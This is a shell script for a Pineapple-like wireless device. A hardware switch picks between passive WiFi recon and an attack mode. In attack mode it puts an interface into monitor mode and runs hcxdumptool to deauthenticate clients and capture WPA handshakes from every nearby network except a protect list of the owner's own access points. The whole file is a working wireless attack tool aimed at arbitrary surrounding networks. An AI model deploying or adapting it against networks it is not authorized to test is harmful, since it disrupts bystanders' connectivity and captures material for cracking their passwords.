#!/bin/sh
# Shadow-Apple hardware-switch mode daemon.
#   Switch FULL-LEFT  = RECON only              green LED
#   Switch anything else (right/middle) = DEAUTH + HANDSHAKE CAPTURE (whitelist)  red LED
# Detection uses the LEFT gpio only (the RIGHT gpio never asserts on this unit).
# 6s debounce so a bump can't trigger deauth. One monitor consumer at a time; single long hcx (no churn).
export LD_LIBRARY_PATH=/sd/usr/lib:/sd/lib:/usr/lib:/lib
LOG=/sd/bot/switch.log
HCXFILTER=/sd/bot/hcx-protect.list
OUT=/sd/handshakes
PIDF=/tmp/bot-mode.pid
RLED=/sys/class/leds/gl-ar300m:red:wlan/brightness
GLED=/sys/class/leds/gl-ar300m:green:system/brightness
led(){ for t in /sys/class/leds/gl-ar300m:*/trigger; do echo none > "$t" 2>/dev/null; done
  case "$1" in
    recon)  echo 0   > $RLED 2>/dev/null; echo 255 > $GLED 2>/dev/null;;
    deauth) echo 255 > $RLED 2>/dev/null; echo 0   > $GLED 2>/dev/null;;
  esac; }
gval(){ grep "button $1" /sys/kernel/debug/gpio 2>/dev/null | grep -oE ' (lo|hi)' | tr -d ' ' | head -1; }
read_pos(){ [ "$(gval left)" = "hi" ] && echo LEFT || echo RIGHT; }
stop_all(){
  [ -f $PIDF ] && kill "$(cat $PIDF)" 2>/dev/null; rm -f $PIDF
  pkill hcxdumptool 2>/dev/null; killall mdk3 2>/dev/null
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf unpause   >/dev/null 2>&1
  sleep 4; }
start_recon(){ led recon
  ( while true; do
      pineap /tmp/pineap.conf run_scan 60 2 >/dev/null 2>&1
      W=0; while [ $W -lt 75 ]; do pineap /tmp/pineap.conf get_status 2>/dev/null | grep scanRunning | grep -q true || break; sleep 5; W=$((W+5)); done
    done ) & echo $! > $PIDF; }
start_deauth(){
  /sd/bot/wl-refresh.sh >/dev/null 2>&1
  # SAFETY: if the user configured protected SSIDs but the filter came out empty
  # (e.g. their APs not yet seen, or a build error), do NOT attack — we would hit
  # their own networks. Stay in recon until the filter has entries.
  if [ -s /sd/bot/protect-ssids.conf ] && [ ! -s "$HCXFILTER" ]; then
    echo "$(date) REFUSING deauth: protected SSIDs configured but filter empty -> recon" >> $LOG
    start_recon; return
  fi
  led deauth
  pineap /tmp/pineap.conf stop_scan >/dev/null 2>&1
  pineap /tmp/pineap.conf pause     >/dev/null 2>&1
  sleep 2
  iw dev 2>/dev/null | grep -q wlan1mon || airmon-ng start wlan1 >/dev/null 2>&1
  sleep 1
  MON=wlan1mon; iw dev 2>/dev/null | grep -q wlan1mon || MON=wlan1
  ip link set "$MON" up 2>/dev/null
  FILT=""; [ -s "$HCXFILTER" ] && FILT="--filterlist_ap=$HCXFILTER --filtermode=1"
  TS=$(date +%Y%m%d_%H%M%S)
  echo "$(date) hcx attack on $MON (protect $([ -s "$HCXFILTER" ] && wc -l < "$HCXFILTER" || echo 0) BSSIDs)" >> $LOG
  /sd/usr/sbin/hcxdumptool -i "$MON" -o "$OUT/attack_$TS.pcapng" -t 5 $FILT --enable_status=3 >> "$OUT/hcx-status.log" 2>&1 &
  echo $! > $PIDF; }
mount | grep -q '/sys/kernel/debug' || mount -t debugfs none /sys/kernel/debug 2>/dev/null
echo "$(date) switch-mode daemon start (left-pin detect, debounced)" >> $LOG
CUR=""; PEND=""; STABLE=0
while true; do
  P=$(read_pos)
  if [ "$P" = "$PEND" ]; then STABLE=$((STABLE+1)); else PEND="$P"; STABLE=1; fi
  if [ "$STABLE" -ge 2 ] && [ "$P" != "$CUR" ]; then
    echo "$(date) -> $P (left=$(gval left) right=$(gval right))" >> $LOG
    stop_all
    case "$P" in LEFT) start_recon;; RIGHT) start_deauth;; esac
    CUR="$P"
  fi
  sleep 3
done
